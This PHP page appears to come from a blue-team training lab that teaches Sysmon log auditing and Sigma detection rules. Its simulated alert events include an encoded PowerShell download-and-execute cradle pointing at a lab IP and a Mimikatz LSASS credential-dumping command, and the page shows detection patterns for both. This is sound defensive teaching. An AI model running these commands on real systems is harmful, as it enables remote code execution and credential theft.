<?php
/**
 * Pikachu-Enhanced v2.0 Blue Team Level 5: SIEM Sysmon Audit & Sigma Rule Generator
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 250, '');
$ACTIVE[220] = 'active open';
$ACTIVE[226] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$sigma_rule = isset($_POST['sigma_rule']) ? $_POST['sigma_rule'] : 'powershell';
$test_result = null;

if (isset($_POST['validate_sigma'])) {
    if ($sigma_rule === 'powershell') {
        $matched_event = [
            'event_id' => '1 (Sysmon Process Creation)',
            'time' => date('Y-m-d H:i:s'),
            'image' => 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            'commandline' => 'powershell.exe -e aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgA4ADgALwBzAC4AcABzADEAJwApAA==',
            'user' => 'NORTH\\eddard.stark'
        ];
        $test_result = [
            'status' => true,
            'rule_name' => 'Encoded PowerShell Execution (Sigma-ID-088)',
            'event' => $matched_event
        ];
    } elseif ($sigma_rule === 'mimikatz') {
        $matched_event = [
            'event_id' => '1 (Sysmon Process Creation)',
            'time' => date('Y-m-d H:i:s'),
            'image' => 'C:\\Users\\Administrator\\AppData\\Local\\Temp\\mimikatz.exe',
            'commandline' => 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
            'user' => 'SEVENKINGDOMS\\administrator'
        ];
        $test_result = [
            'status' => true,
            'rule_name' => 'Mimikatz LSASS Password Dumping (Sigma-ID-099)',
            'event' => $matched_event
        ];
    }
}
?>

<style>
.siem-hero-banner {
    background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 100%);
    border-radius: 16px;
    padding: 30px;
    color: #ffffff;
    margin-bottom: 25px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.15);
    border: 1px solid rgba(255,255,255,0.1);
}
.siem-box {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 22px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
}
.code-display {
    background: #0f172a;
    color: #93c5fd;
    border-radius: 8px;
    padding: 16px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 13px;
    line-height: 1.7;
    margin-top: 10px;
    border: 1px solid #1e293b;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <!-- Hero Header -->
            <div class="siem-hero-banner">
                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                    <div>
                        <h1 style="font-size: 26px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 10px;">
                            <span class="label label-primary" style="font-size: 14px; border-radius: 6px;">LEVEL 5</span>
                            📊 SIEM / Sysmon 日志审计与 Sigma 防御规则编写实验室
                        </h1>
                        <p style="margin: 0; color: #bfdbfe; font-size: 14px;">
                            <strong>防守维度：</strong> SIEM (Security Information & Event Management)、Sysmon Event 审计与通用 Sigma 规则构建
                        </p>
                    </div>
                    <a href="defense.php" class="btn btn-default btn-sm" style="border-radius: 6px; font-weight: bold;">
                        <i class="fa fa-arrow-left"></i> 返回蓝队总控大厅
                    </a>
                </div>
            </div>

            <!-- Theory -->
            <div class="siem-box">
                <h3 style="margin-top: 0; font-weight: 700; color: var(--text-primary);"><i class="fa fa-line-chart" style="color: #2563eb;"></i> SIEM & Sigma 防御规则的行业标准</h3>
                <p style="color: var(--text-secondary); line-height: 1.7; font-size: 14px;">
                    在企业级安全防护中，Windows <strong>Sysmon (System Monitor)</strong> 会记录极度详细的系统事件（如 <code>Event ID 1: 进程创建</code>、<code>Event ID 10: 进程内存读取</code>）。
                    蓝队使用 **Sigma 语言**（一种独立于 SIEM 平台的通用 YAML 语法规则）编写检测规则。Sigma 规则可以一键转换为 Splunk、Elasticsearch (ELK)、Microsoft Sentinel 的查询语句，实现全网威胁的自动拦截与告警！
                </p>
            </div>

            <div class="row">
                <!-- Sigma Editor -->
                <div class="col-md-6">
                    <div class="siem-box">
                        <h3 style="margin-top: 0; font-weight: 700; color: var(--text-primary);"><i class="fa fa-file-text-o" style="color: #2563eb;"></i> 在线 Sigma 规则匹配与测试</h3>
                        
                        <form method="post">
                            <div class="form-group">
                                <label style="font-weight: 700;">选择要校验的 Sigma 告警规则：</label>
                                <select name="sigma_rule" class="form-control" style="border-radius: 8px; height: 44px; padding: 8px 12px; font-size: 14px;">
                                    <option value="powershell" <?php echo $sigma_rule==='powershell'?'selected':'';?>>1. 编码 Base64 PowerShell 隐蔽下载执行规则</option>
                                    <option value="mimikatz" <?php echo $sigma_rule==='mimikatz'?'selected':'';?>>2. Mimikatz LSASS 内存读取与凭据 Dump 规则</option>
                                </select>
                            </div>

                            <label style="font-weight: 700;">当前规则对应的 Sigma YAML 定义：</label>
                            <div class="code-display">
title: <?php echo $sigma_rule==='powershell'?'Encoded PowerShell Execution':'Mimikatz Credential Dumping'; ?>

status: experimental
logsource:
  product: windows
  service: sysmon
detection:
  selection:
<?php if ($sigma_rule==='powershell') { ?>
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - '-e '
      - '-enc'
<?php } else { ?>
    CommandLine|contains:
      - 'sekurlsa::logonpasswords'
      - 'privilege::debug'
<?php } ?>
  condition: selection
level: critical
                            </div>

                            <button type="submit" name="validate_sigma" class="btn btn-primary btn-block" style="margin-top: 15px; border-radius: 8px; font-weight: 700;">
                                <i class="fa fa-play"></i> 执行 SIEM 日志流水规则匹配
                            </button>
                        </form>
                    </div>
                </div>

                <!-- Match Output -->
                <div class="col-md-6">
                    <div class="siem-box">
                        <h3 style="margin-top: 0; font-weight: 700; color: var(--text-primary);"><i class="fa fa-desktop" style="color: #3b82f6;"></i> SIEM 告警流与 Sysmon 事件匹配结果</h3>
                        
                        <?php if ($test_result === null) { ?>
                            <div class="alert alert-info" style="border-radius: 8px; font-size: 14px;">
                                <i class="fa fa-info-circle"></i> 点击左侧按钮匹配全网 Sysmon 实时日志。
                            </div>
                        <?php } else { ?>

                            <div class="alert alert-danger" style="border-radius: 8px; background: rgba(239, 68, 68, 0.1); border-color: #ef4444; color: #dc2626;">
                                <h4 style="margin-top: 0; font-weight: bold;"><i class="fa fa-bell"></i> SIEM ALERT: 命中 CRITICAL 级威胁告警规则！</h4>
                                <p style="margin-bottom: 0;">Sigma 规则匹配到了符合特质的高危 Sysmon 进程派生行为，已推送至 SOC 处置面板。</p>
                            </div>

                            <div class="code-display" style="background: #0f172a; border-left: 4px solid #ef4444;">
<span style="color: #ef4444;">[SIEM_ALERT]</span> Rule Title: <?php echo $test_result['rule_name']; ?>
<span style="color: #ef4444;">[SIEM_ALERT]</span> Severity: CRITICAL (Score: 10/10)
<span style="color: #fbbf24;">[SYSMON_EVENT]</span> Event ID: <?php echo $test_result['event']['event_id']; ?>
<span style="color: #fbbf24;">[SYSMON_EVENT]</span> Timestamp: <?php echo $test_result['event']['time']; ?>
<span style="color: #38bdf8;">[SYSMON_EVENT]</span> User Context: <?php echo $test_result['event']['user']; ?>
<span style="color: #38bdf8;">[SYSMON_EVENT]</span> Process Image: <?php echo $test_result['event']['image']; ?>
<span style="color: #34d399;">[RAW_COMMAND]</span> CommandLine: <?php echo htmlspecialchars($test_result['event']['commandline']); ?>
                            </div>

                        <?php } ?>

                    </div>
                </div>
            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
